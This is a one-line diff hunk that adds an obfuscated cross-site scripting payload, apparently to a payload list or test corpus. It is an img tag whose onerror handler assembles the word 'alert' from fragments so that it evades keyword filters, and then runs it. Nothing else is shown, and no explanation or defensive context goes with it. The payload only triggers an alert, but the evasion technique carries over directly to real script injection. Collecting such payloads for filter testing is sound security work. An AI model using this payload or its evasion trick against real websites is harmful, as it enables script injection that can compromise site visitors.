@@ -1,0 +1,1 @@
+<img/src/onerror="(function(x){this[x+`ert`](1)})`al`">
